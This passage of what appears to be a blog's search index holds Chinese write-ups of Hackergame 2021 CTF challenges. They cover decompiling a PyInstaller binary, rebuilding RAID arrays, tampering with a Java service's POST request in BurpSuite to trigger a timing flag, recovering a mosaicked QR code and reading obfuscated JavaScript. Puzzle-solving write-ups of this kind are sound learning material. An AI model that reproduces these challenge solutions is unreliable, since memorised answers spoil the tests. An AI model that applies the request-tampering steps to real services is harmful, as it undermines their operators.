\u7b80\u5355\u8bf4\u6765\u5c31\u662f\uff0c\u6bcf\u5929\u53ef\u4ee5\u7f16\u5199\u65b0\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u53ea\u80fd\u8fd0\u884c\u4e00\u4e2a\u4e4b\u524d\u7f16\u5199\u8fc7\u7684\u7a0b\u5e8f \u6bcf\u4e2a\u7a0b\u5e8f\u53ea\u6709\u51e0\u79cd\u6307\u4ee4\u53ef\u4ee5\u4f7f\u7528\uff0c\u9700\u8981\u5728\u5176\u4e2d\u6ee1\u8db3\u83dc\u8c31\u7684\u987a\u5e8f\u8981\u6c42 \u800c\u95ee\u9898\u5728\u4e8e\uff0c\u7f16\u5199\u7a0b\u5e8f\u540e\u7684\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4f1a\u4e0d\u540c\uff0c\u5bfc\u81f4\u524d\u9762\u7f16\u5199\u7684\u7a0b\u5e8f\u65e0\u6cd5\u4f7f\u7528 \u6240\u4ee5\u5c31\u9700\u8981 \u9884\u6d4b \u7b2c\u4e8c\u5929\u7684\u83dc\u8c31","title":"\u8d5b\u535a\u53a8\u623f"},{"location":"writeups/hackergame2021/#level-0","text":"\u53ef\u4ee5\u770b\u5230\u7b2c 0 \u5929\u7684\u83dc\u8c31\u662f 1, 0\uff0c\u4e5f\u5c31\u662f\u8981\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u4f9d\u6b21\u5411\u9505(1,0)\u4e2d\u653e\u5165 1 \u53f7\u98df\u7269(0,2)\u548c 0 \u53f7\u98df\u7269(0,1) \u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\uff0c\u76f4\u63a5\u5230\u4e0b\u4e00\u5929\uff0c\u53ef\u4ee5\u53d1\u73b0\u83dc\u8c31\u53d1\u751f\u4e86\u53d8\u5316 \u591a\u6b21\u5c1d\u8bd5\u4e4b\u540e\u53d1\u73b0\u83dc\u8c31 \u53ea\u6709 0,0 / 0,1 / 1,0 / 1,1 \u56db\u79cd \u6240\u4ee5\u5728\u7b2c 0 \u5929\u7f16\u5199\u5b66\u4e60\u56db\u4e2a\u7a0b\u5e8f\uff0c\u5230\u4e0b\u4e00\u5929\u5c31\u53ef\u4ee5\u6839\u636e\u83dc\u8c31\u6765\u6267\u884c\u4e86 \u4f8b\u5982\u7a0b\u5e8f 1,0 \u5c31\u53ef\u4ee5\u7f16\u5199\u4e3a\uff1a \u5411\u53f3 2 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 2 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u5411\u53f3 1 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u53ea\u8981\u6b63\u786e\u4e86\u4e00\u5929\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86","title":"Level 0"},{"location":"writeups/hackergame2021/#level-1","text":"\u53ea\u6709 1 \u4e2a\u98df\u7269\uff0c\u83dc\u8c31\u662f\u597d\u591a 0 \u540c\u6837\u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\u8fdb\u5165\u4e0b\u4e00\u5929\uff0c\u53d1\u73b0\u83dc\u8c31 \u6ca1\u6709\u53d8\u5316 \uff0c\u8fd8\u662f 73 \u4e2a 0 \u6240\u4ee5\u8fd9\u4e00\u5173\u53ef\u80fd\u53ea\u662f\u5faa\u73af\u7684\u6559\u7a0b \u53ef\u7528\u7684\u6307\u4ee4\u4e2d\u6709\u4e00\u6761 \u201c\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c\u201d \u53ef\u4ee5\u7528\u5b83\u6765\u8fbe\u5230 \u5faa\u73af \u7684\u6548\u679c \u53ea\u9700\u8981\u62ff 73 \u4e2a\u7269\u54c1\uff0c\u7136\u540e\u5faa\u73af\u653e\u4e0b\u76f4\u5230\u624b\u4e2d\u6ca1\u6709\u4e86\u5373\u53ef \u5411\u53f3 1 \u6b65 \u62ff\u8d77 73 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e 1 \u5411\u4e0a\u8df3\u8f6c 1 \u884c \u540c\u6837\u4fdd\u5b58\u4e0b\u4e00\u5929\u6267\u884c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 \u5269\u4e0b\u7684\u4e24\u4e2a\u770b\u8d77\u6765\u5927\u6982\u662f\u901a\u8fc7\u6e90\u7801\u6765\u63a8\u6d4b\u51fa\u83dc\u8c31\u7684\u751f\u6210\u65b9\u6cd5\uff0c\u7136\u540e\u7f16\u5199\u76f8\u5e94\u7684\u6307\u4ee4\uff0c\u592a\u96be\u4e86\uff0c\u4e0d\u4f1aqwq","title":"Level 1"},{"location":"writeups/hackergame2021/#micro-world","text":"\u5b87\u5b99\u4e2d\u67d0\u4e00\u7247\u6781\u5176\u5fae\u5c0f\u7684\u533a\u57df\u91cc\u7684\u7c92\u5b50\u88ab\u4e00\u80a1\u795e\u79d8\u529b\u91cf\u521d\u59cb\u5316\u8bbe\u7f6e\u6210\u4e86 flag \u7684\u5f62\u72b6\uff0c\u7a0b\u5e8f\u5fe0\u5b9e\u5730\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u3002 \u62ff\u5230\u4e86 exe \u6587\u4ef6\uff0c\u770b\u8d77\u6765\u633a\u7cbe\u81f4\uff0c\u8fd0\u884c\u8d77\u6765\u662f\u4e00\u4e9b\u70b9\u8fd0\u52a8\u78b0\u649e\u7684\u573a\u666f \u62d6\u5230 IDA \u91cc\u770b\u770b\uff0c\u53d1\u73b0\u4e86 __main__ \u4ee5\u53ca .rdata \u91cc\u4e00\u4e9b py \u6709\u5173\u7684\u5b57\u7b26\u4e32\uff1a \u6240\u4ee5\u63a8\u6d4b\u662f\u4f7f\u7528 python \u7f16\u5199\u7684\uff0c\u7136\u540e\u7528 pyinstaller \u6253\u5305 \u8fd9\u6837\u7684\u8bdd\u8bd5\u7740\u7528 pyinstxtractor \u89e3\u5305 .exe\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u91cc\u9762\u662f\u4e00\u5806 .pyc .pyd .dll \u6587\u4ef6\uff0c\u4ece\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u5927\u90e8\u5206\u662f import \u7684\u5305\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684 2.pyc \u6240\u4ee5\u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u7f16\u8bd1\u540e\u7684\u6e90\u7801\u4e86 \u63a5\u4e0b\u6765\u7528 uncompyle6 \u6765\u53cd\u7f16\u8bd1 pyc \u6587\u4ef6\uff0c\u8f93\u51fa\u5f97\u5230\u4e86\u6e90\u7801 2.py \u5c1d\u8bd5\u8fd0\u884c\uff0c\u53d1\u73b0\u8dd1\u8d77\u6765\u4e4b\u540e\u53ea\u6709\u4e00\u4e2a\u70b9\u5728\u8fd0\u52a8\uff0c\u5e94\u8be5\u662f\u53cd\u7f16\u8bd1\u65f6\u51fa\u4e86\u4e9b\u95ee\u9898 \u4e8e\u662f\u5f00\u59cb\u770b\u6e90\u7801 \u57fa\u672c\u4e0a\u7b80\u5355\u8bf4\u5c31\u662f\uff0c\u521d\u59cb\u6709\u4e00\u4e9b\u6570\u636e\uff0c\u8868\u793a\u6bcf\u4e2a\u70b9\u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\uff0c\u7136\u540e\u8fd0\u884c\uff0c\u6bcf\u6b21\u8fd0\u884c\u90fd\u68c0\u6d4b\u78b0\u649e\uff0c\u7136\u540e\u83b7\u5f97\u65b0\u7684\u70b9\u4f4d\u7f6e\uff0c\u518d\u7ed8\u5236\u51fa\u6765 \u8c03\u8bd5\u4e00\u4e0b\uff0c\u8f93\u51fa\u6bcf\u6b21\u7684 pointlist\uff0c\u53d1\u73b0\u7b2c\u4e00\u6b21\u662f\u6240\u6709\u70b9\uff0c\u7b2c\u4e8c\u6b21\u53d8\u62102\u4e2a\uff0c\u7b2c\u4e09\u6b21\u5f80\u540e\u5c31\u53ea\u6709\u4e00\u4e2a\u4e86 \u6240\u4ee5\u95ee\u9898\u5927\u6982\u5c31\u51fa\u5728\u4e86 next_pos_list \u51fd\u6570\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: times = checkcrush ( Pointlist [ i ], point ) if times != None : a , b = get_new_point ( times , Pointlist [ i ], point ) pointlist . extend ([ a , b ]) Pointlist [ i ] . flag = 0 point . flag = 0 else : for item in Pointlist : if item . flag != 0 : pointlist . append ( Point (( item . x + item . vx , item . y + item . vy ), item . vx , item . vy )) for poi in pointlist : poi . x = poi . x % WIDTH poi . y = poi . y % HEIGHT else : return pointlist \u4ed4\u7ec6\u8bfb\u4e00\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u9762\u7684 for-else \u5757\u5f88\u5947\u602a\uff0c\u5bfc\u81f4\u5faa\u73af\u7ed3\u675f\u548c return \u90fd\u65e9\u4e86\uff0c\u6240\u4ee5\u6839\u636e\u51fd\u6570\u7684\u610f\u601d\u6539\u4e00\u6539\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: ... for item in Pointlist : ... return pointlist \u8fd9\u6837\u5c31\u53ef\u4ee5\u6210\u529f\u8fd0\u884c\u4e86 \u4f46\u662f\u753b\u9762\u4ecd\u7136\u662f\u6742\u4e71\u7684\u3002\u56e0\u4e3a\u9898\u91cc\u8bf4\u4e86 \u201c\u8bb0\u5f55\u4e86 \u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e \u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u201d \u6240\u4ee5\u9700\u8981\u5c06\u8f68\u8ff9\u5f80\u524d\u63a8\uff0c\u6700\u65b9\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u66f4\u6539\u6bcf\u4e2a\u70b9\u7684\u901f\u5ea6\u65b9\u5411\uff1a Pointlist = [] for item in list_ : Pointlist . append ( Point (( item [ 0 ], item [ 1 ]), - item [ 2 ], - item [ 3 ])) \u8fd0\u884c\u540e\u7b49\u5f85\u4e00\u5c0f\u4f1a\u513f\u5c31\u53ef\u4ee5\u770b\u5230\u70b9\u9010\u6e10\u6709\u5e8f\uff0c\u5728\u67d0\u4e00\u523b\u6c47\u6210\u4e86 flag\uff1a \u867d\u7136\u4e0d\u592a\u6e05\u6670\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u731c\u4e2a\u5927\u6982","title":"Micro World"},{"location":"writeups/hackergame2021/#_10","text":"\uff08\u8fd9\u9898\u6574\u6574\u505a\u4e86\u6211\u4e24\u5929\u591a\uff0c\u6bcf\u5929\u665a\u4e0a\u90fd\u5bf9\u7740\u78c1\u76d8\u9635\u5217\u2026\u2026\uff09 \u4ee5\u4e0b\u662f\u4e24\u4e2a\u538b\u7f29\u5305\uff0c\u5206\u522b\u662f\u4e00\u4e2a RAID 0 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u548c\u4e00\u4e2a RAID 5 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u5bf9\u5e94\u672c\u9898\u7684\u4e24\u5c0f\u95ee\u3002\u4f60\u9700\u8981\u89e3\u6790\u5f97\u5230\u6b63\u786e\u5b8c\u6574\u7684\u78c1\u76d8\u9635\u5217\uff0c\u6302\u8f7d\u7b2c\u4e00\u4e2a\u5206\u533a\u540e\u5728\u8be5\u5206\u533a\u6839\u76ee\u5f55\u4e0b\u4f7f\u7528 Python 3.7 \u6216\u4ee5\u4e0a\u7248\u672c\u6267\u884c getflag.py \u811a\u672c\u4ee5\u83b7\u53d6 flag\u3002\u78c1\u76d8\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\u3002","title":"\u9635\u5217\u6062\u590d\u5927\u5e08"},{"location":"writeups/hackergame2021/#raid-5","text":"\u867d\u7136 RAID 5 \u662f\u7b2c\u4e8c\u95ee\uff0c\u800c\u4e14\u5206\u6570\u9ad8\uff0c\u4f46\u662f\u66f4\u597d\u505a\uff0c\u800c\u4e14\u505a\u51fa\u7684\u4eba\u4e5f\u591a\u3002 \u56e0\u4e3a\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\uff0c\u6240\u4ee5\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u627e\u51fa\u4e94\u4e2a\u78c1\u76d8\u7684\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u987a\u5e8f\u53ef\u4ee5\u5148\u7b80\u5355\u5730\u770b\u770b strings *.img \u8f93\u51fa\u7684\u5185\u5bb9 \u9010\u4e2a\u6587\u4ef6\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u6587\u4ef6\u6bd4\u8f83\u9760\u524d\u7684\u5730\u65b9\u4f1a\u6709\u4e00\u6bb5\u662f git \u5386\u53f2\u8bb0\u5f55\u7684\u4e00\u90e8\u5206: \u6839\u636e\u91cc\u9762\u7684\u65f6\u95f4\u53ef\u4ee5\u63a8\u65ad\u51fa\u78c1\u76d8\u7684\u987a\u5e8f\u5927\u81f4\u662f\uff1a Qj... -> 60... -> 3R... -> Ir... -> 3D... \u53ea\u662f\uff0c\u8fd9\u4e2a\u987a\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a\u73af\uff0c\u8c01\u5728\u7b2c\u4e00\u8fd8\u6ca1\u533a\u5206\u51fa\u6765 \u5728\u770b\u6bcf\u4e2a\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u53ea\u6709 60... \u548c 3R... \u6709 \u201cEFI PART\u201d: \u6240\u4ee5\u5e94\u8be5\u662f\u4e00\u4e2a\u5728\u5f00\u5934\uff0c\u4e00\u4e2a\u5728\u7ed3\u5c3e\u3002\u6240\u4ee5\u6700\u7ec8\u7684\u987a\u5e8f\u662f\uff1a 3R... -> Ir... -> 3D... -> Qj... -> 60... \u7136\u540e\u9700\u8981\u627e\u5230\u5757\u5927\u5c0f \u76f4\u63a5\u4e22\u5230 DiskGenius \u91cc\u7ec4\u5efa\u865a\u62df RAID\uff0c\u9009\u5de6\u540c\u6b65\uff0c\u7136\u540e\u53ef\u4ee5\u8bd5\u51fa\u6765\u5f53\u5757\u5927\u5c0f\u662f 64k \u7684\u65f6\u5019\u6b63\u597d\u53ef\u4ee5\u62fc\u51fa\u5b8c\u6574\u78c1\u76d8 \u7136\u540e\u514b\u9686\u78c1\u76d8\u751f\u6210 img \u6587\u4ef6\uff0c\u518d\u6302\u8f7d\uff0c\u8fdb\u5165\uff0c\u6267\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag","title":"RAID 5"},{"location":"writeups/hackergame2021/#raid-0","text":"\u5728\u505a RAID 5 \u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u53eb Raid Reconstructor \u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7206\u7834 RAID \u9635\u5217\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u6240\u4ee5\u8fd9\u95ee\u4e5f\u5c31\u61d2\u5f97\u770b\u4e86\uff0c\u76f4\u63a5\u4e22\u7ed9 Raid Reconstructor \u6765\u7206\u7834\uff0c\u5f97\u5230\u6700\u63a8\u8350\u7684\u987a\u5e8f\uff1a wl. -> jC. -> 1G. -> 5q. -> d3. -> eR. -> RA. -> ID. \u548c\u5757\u5927\u5c0f 128k \u7136\u540e\u76f4\u63a5\u7528 Raid Reconstructor \u7684 Copy \u5bfc\u51fa img \u6587\u4ef6\uff0c\u63d0\u53d6\u540e\u53c8\u5f97\u5230\u4e00\u4e2a\u65b0\u7684 img \u6587\u4ef6 \u901a\u8fc7 file \u53ef\u4ee5\u770b\u5230\u7ed3\u679c\u7684\u6587\u4ef6\u7cfb\u7edf\u662f XFS $ file MyDisk.img MyDisk.img: SGI XFS filesystem data ( blksz 4096 , inosz 512 , v2 dirs ) \u4f46\u662f\u59cb\u7ec8\u65e0\u6cd5\u6302\u8f7d\uff08\u641e\u4e86\u4e00\u5929\uff09 \u53ef\u80fd\u662f Raid Reconstructor \u7684\u95ee\u9898\uff0c\u6240\u4ee5\u53c8\u7528 DiskGenius \u8bd5\u4e86\u4e0b \u56e0\u4e3a win \u548c DiskGenius \u8bfb\u4e0d\u4e86 XFS \u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u62fc\u8d77\u6765\u4e4b\u540e\u76f4\u63a5\u514b\u9686\u51fa img \u6587\u4ef6 \u7136\u540e\u62d6\u5230 Kali Linux \u91cc\u6302\u8f7d\uff0c\u6210\u529f\u6302\u8f7d\u540e\u8fdb\u5165\u3001\u8fd0\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag","title":"RAID 0"},{"location":"writeups/hackergame2021/#_11","text":"\u9898\u76ee\u6709\u6548\u5185\u5bb9\uff1a \u4f60\u7684\u5ba4\u53cb\u7ec8\u4e8e\u8fde\u591c\u8d76\u5b8c\u4e86\u4ed6\u7684 Java \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u8bfe\u7a0b\u5927\u4f5c\u4e1a\u3002\u770b\u8d77\u6765\u4ed6\u4f7f\u7528 Java 17 \u5199\u4e86\u4e00\u4e2a\u4fdd\u5b58\u52a9\u8bb0\u8bcd\u7684\u540e\u7aef\uff0c\u5f53\u7136\u8fd8\u6709\u914d\u5957\u7684\u524d\u7aef\u3002\u52a9\u8bb0\u8bcd\u7531\u56db\u4e2a\u82f1\u6587\u5355\u8bcd\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7528\u6237\u6700\u591a\u4fdd\u5b58 32 \u6761\u3002 \u4f60\u4ece\u4ed6\u5145\u6ee1\u6fc0\u60c5\u5374\u53c8\u5939\u6742\u4e0d\u6e05\u7684\u8868\u8ff0\u4e2d\u5f97\u77e5\uff0c\u4ed6\u4f3c\u4e4e\u8fd8\u4e3a\u6b64\u4e13\u95e8\u5728\u5927\u4f5c\u4e1a\u91cc\u85cf\u4e86\u4e24\u4e2a flag\uff1a\u5f53\u8bbf\u95ee\u5ef6\u8fdf\u8fbe\u5230\u4e24\u4e2a\u7279\u6b8a\u7684\u9608\u503c\u65f6\uff0cflag \u4fbf\u4f1a\u6253\u5370\u51fa\u6765\uff0c\u5c4a\u65f6\u4f60\u4fbf\u53ef\u4ee5\u62ff\u7740 flag \u8ba9\u4f60\u7684\u5ba4\u53cb\u8bf7\u4f60\u5403\u4e00\u987f\u5927\u9910\u3002 \u4e0b\u8f7d\u5230\u6e90\u7801\u540e\u7ffb\u4e00\u7ffb\uff0c\u6709\u7528\u7684\u5c31\u53ea\u6709 Phrase.java \u548c Instance.java \u5176\u4e2d Phrase.java \u5b9a\u4e49\u4e86 Phrase\uff0c\u5176\u4e2d\u91cd\u8f7d\u4e86 equals \u65b9\u6cd5\uff0c\u5176\u4e2d\u6709\uff1a try { TimeUnit . MILLISECONDS . sleep ( EQUALS_DURATION_MILLIS ); // 20ms // TODO: remove it since it is for debugging } catch ( InterruptedException e ) { throw new RuntimeException ( e ); } \u6240\u4ee5\u5728\u6bcf\u6b21\u6bd4\u8f83\u76f8\u7b49\u7684\u65f6\u5019\u5c31\u4f1a sleep 20ms \u800c Instance.java \u7684 post \u65b9\u6cd5\u4e2d\u5bf9\u4e8e\u6bcf\u6b21\u7684\u8f93\u5165\uff0c\u904d\u5386\u8f93\u5165\u7684\u5217\u8868\uff0c\u7136\u540e\u9010\u4e2a\u52a0\u8fdb HashMap \u4e2d \u5728\u52a0\u5165 HashMap \u7684\u65f6\u5019\u5c31\u6d89\u53ca\u5230\u5224\u65ad\u662f\u5426\u76f8\u7b49 \u800c\u6700\u7ec8\u4f1a\u5224\u65ad\u5728\u5b8c\u6210\u524d\u540e\u7684\u603b\u7684\u65f6\u95f4\u95f4\u9694\u662f\u591a\u5c11\uff0c\u5982\u679c\u5927\u4e8e 600ms \u5c31\u63d0\u53d6\u51fa\u7b2c\u4e00\u4e2a flag\uff1a var modified = 0 ; var before = System . nanoTime (); for ( var i = 0 ; i < input . length () && i < MAX_PHRASES && phrases . size () < MAX_PHRASES ; ++ i ) { var text = input . optString ( i , \"\" ). toLowerCase ( Locale . ENGLISH ); modified += phrases . add ( Phrase . create ( this . mnemonics , text , token )) ? 1 : 0 ; // \u8fd9\u91cc\u4f1a sleep } var after = System . nanoTime (); var duration = TimeUnit . MILLISECONDS . convert ( after - before , TimeUnit . NANOSECONDS ); if ( duration > FLAG1_DURATION_MILLIS ) { // 600ms token . addFlag ( 1 , flag -> output . put ( \"flag1\" , flag )); } \u800c\u5728\u7f51\u9875\u4e2d\u6dfb\u52a0\u6761\u76ee\u7684\u65f6\u5019\uff0c\u4e00\u6b21\u53ea\u80fd\u6dfb\u52a0\u4e00\u6761\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a POST \u91cc\u9762\u53ea\u6709\u4e00\u4e2a Phrase \u4f46\u662f\u6e90\u7801\u4e2d\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u904d\u5386\u6574\u4e2a input\uff0c\u6240\u4ee5\u4e00\u4e2a POST \u91cc\u7684\u5185\u5bb9\u5176\u5b9e\u662f\u4e00\u4e2a\u5217\u8868 \u6240\u4ee5\u53ef\u4ee5\u7528 BurpSuite \u83b7\u53d6 POST \u7136\u540e\u66f4\u6539\u4e00\u4e0b\u5185\u5bb9\u518d\u53d1\u9001\u51fa\u53bb\uff08\u5148 random \u4e00\u4e2a\uff0c\u7136\u540e add\uff09 \u6839\u636e flag \u91cc\u7684\u63d0\u793a\uff0c\u6b63\u89e3\uff08\u7b2c\u4e8c\u987f\u5927\u9910\uff09\u5e94\u8be5\u662f\u4f7f\u7528\u54c8\u5e0c\u78b0\u649e\uff0c \u4f46\u662f\u4e0d\u4f1a","title":"\u52a9\u8bb0\u8bcd"},{"location":"writeups/hackergame2021/#_12","text":"\uff08\u8fd9\u9053\u9898\u5df2\u7ecf\u505a\u7834\u9632\u4e86\uff0c\u672c\u4ee5\u4e3a\u662f\u4e2a\u9752\u94dc\uff0c\u7ed3\u679c\u662f\u4e2a\u738b\u8005\u2026\u2026\uff09 \u6211\u505a\u7684\u80af\u5b9a\u4e0d\u662f\u6b63\u89e3\uff0c\u5229\u7528\u4e8c\u7ef4\u7801\u7ea0\u9519\u80fd\u529b\u52c9\u5f3a\u62ff\u5230\u4e86 flag\uff0c\u6240\u4ee5\u5c31\u4e0d\u8be6\u7ec6\u5199 writeup \u4e86\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u770b\u5b98\u65b9 wp\uff08\u9003 \u5927\u6982\u6b65\u9aa4\u5c31\u662f\uff1a \u8bfb\u56fe\u7247 \u628a\u5df2\u77e5\u7684\u50cf\u7d20\u63d0\u53d6\u51fa\u6765 \u628a\u56db\u4e2a\u5c0f\u5b9a\u4f4d\u5757\u586b\u4e0a \u6328\u4e2a\u9a6c\u8d5b\u514b\u5757\u5bfb\u627e\u4f7f\u8fd8\u539f\u7684\u6570\u636e\u5e73\u5747\u6570\u4e0e\u539f\u9a6c\u8d5b\u514b\u503c\u5dee\u7684\u7edd\u5bf9\u503c\u5c0f\u4e8e1\u7684\u586b\u8865\u65b9\u6cd5 \u5982\u679c\u53ea\u6709\u4e00\u79cd\u5c31\u586b\u4e0a\uff0c\u5e76\u4e14\u6807\u6ce8\u5df2\u7ecf\u586b\u597d\uff0c\u4ee5\u540e\u4e0d\u518d\u641c\u5bfb \u5982\u679c\u6709\u591a\u79cd\u5c31\u5148\u653e\u4e0b\u4e0d\u586b \u91cd\u590d4\u7684\u8fc7\u7a0b\uff0c\u8fd9\u662f\u8fd8\u4f1a\u6709\u552f\u4e00\u786e\u5b9a\u7684\u586b\u8865\u65b9\u6848\u3002\u91cd\u590d4\u6b21\u5927\u6982\u5c31\u4e0d\u5269\u552f\u4e00\u89e3\u4e86 \u8fd9\u65f6\u91cd\u590d4\uff0c\u627e\u51fa\u4ec5\u67092\u4e2d\u586b\u8865\u65b9\u6cd5\u7684\uff0c\u9009\u8bef\u5dee\u6700\u5c0f\u7684\u586b\u4e0a \u7136\u540e\u518d\u91cd\u590d4 \u7136\u540e\u91cd\u590d6 \u7136\u540e\u91cd\u590d4 \u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8fd8\u539f\u5f97\u5dee\u4e0d\u591a\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7ba1\u76f4\u63a5\u626b\u7801\u4e5f\u53ef\u4ee5\u626b\u51fa flag \u4e86 \u770b\uff0c\u505a\u6cd5\u5f88\u70c2\u5bf9\u5427","title":"\u9a6c\u8d5b\u514b"},{"location":"writeups/hackergame2021/#minecraft","text":"kk \u540c\u5b66\u5f88\u559c\u6b22\u73a9 Minecraft\uff0c\u4ed6\u6700\u8fd1\u6536\u5230\u4e86\u4e00\u5f20 MC \u5730\u56fe\uff0c\u5730\u56fe\u91cc\u9762\u6709\u4e09\u76cf\u706f\uff0c\u8fd8\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u538b\u529b\u677f\u3002 \u4f46\u4ed6\u53d1\u73b0\u8fd9\u4e9b\u706f\u597d\u50cf\u4e0d\u592a\u7b26\u5408 MC \u7535\u78c1\u5b66\uff08Red stone\uff09\uff0c\u4f60\u80fd\u5e2e\u4ed6\u628a\u706f\u5168\u90e8\u70b9\u4eae\u5417\uff1f \u6ce8\uff1a\u672c\u9898\u89e3\u6cd5\u4e0e\u539f\u7248 Minecraft \u6e38\u620f\u65e0\u5173\u3002 \u8865\u5145\u8bf4\u660e\uff1aflag \u82b1\u62ec\u53f7\u5185\u4e3a\u8ba9\u4e09\u76cf\u706f\u5168\u90e8\u70b9\u4eae\u7684\u6700\u77ed\u7684\u8f93\u5165\u5e8f\u5217\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8e29\u8e0f\u538b\u529b\u677f\u8f93\u5165\u7684\u6700\u77ed\u7684\u5e8f\u5217\u4e3a abc\uff0c\u5219\u7b54\u6848\u4e3a flag{abc}\u3002 \u8fd8\u633a\u597d\u73a9\u7684\u9898\uff0c\u5728\u7f51\u9875\u4e2d\u6a21\u62df\u4e86\u4e00\u4e2amc\u51fa\u6765 \u770b\u6e90\u7801\u770b\u5230\u4e86\u5f15\u5165\u4e86 flag.js \u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u662f\u8981\u901a\u8fc7\u5b83\u6765\u5f97\u5230\u7b54\u6848\uff1a < script src = \"jsm/miscs/flag.js\" ></ script > \u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u6700\u7ec8\u5224\u65ad\u662f\u5426\u6b63\u786e\u662f\u901a\u8fc7\u8c03\u7528 gyflagh(input) \u662f\u5426\u4e3a true \u6765\u5224\u65ad\uff0c\u800c gyflagh \u4e5f\u5728 flag.js \u4e2d\uff0c\u6240\u4ee5\u8fd8\u662f\u8981\u770b flag.js \u4f46\u662f flag.js \u662f\u7ecf\u8fc7\u7b80\u5355\u6df7\u6dc6\u8fc7\u7684\uff0c\u8fd8\u662f\u8981\u8d39\u70b9\u65f6\u95f4\u8bfb\u4e00\u4e0b \u5176\u4e2d\u6709\u56db\u4e2a\u8f6c\u6362 Str4 Base16 \u548c Long \u7684\u51fd\u6570\u53ef\u4ee5\u7565\u6389\u4e0d\u7ba1 \u6ce8\u610f\u5230\u4e86 _0x381b() \u8fd9\u4e2a\u51fd\u6570\u91cc\u6709\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e14\u6bd4\u8f83\u7b80\u5355\uff0c\u5176\u5b9e\u5b83\u8fd4\u56de\u7684\u5c31\u662f\u8fd9\u4e2a\u5217\u8868 ['encrypt', '33MGcQht', '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c', '14021KbbewD', 'charCodeAt', '808heYYJt', '5DlyrGX', '552oZzIQH', 'fromCharCode', '356IjESGA', '784713mdLTBv', '2529060PvKScd', '805548mjjthm', '844848vFCypf', '4bIkkcJ', '1356853149054377', 'length', 'slice', '1720848ZSQDkr'] \u4f46\u662f\u5728 Console \u91cc\u9762\u8c03\u7528 _0x381b \u5f97\u5230\u7684\u5374\u662f\u4ee5 'slice' \u5f00\u5934\u3001'length' \u7ed3\u5c3e\u7684\u5217\u8868\uff0c\u5c06\u8fd9\u4e2a\u5217\u8868\u8bb0\u4e3a lst \u65b9\u4fbf\u8868\u8ff0 \u800c\u4e14\u6e90\u7801\u4e2d\u53ea\u6709\u6700\u5f00\u5934\u7684\u8c03\u7528\u533f\u540d\u51fd\u6570\u91cc\u9762\u6709 ['push'] \u548c ['shift'] 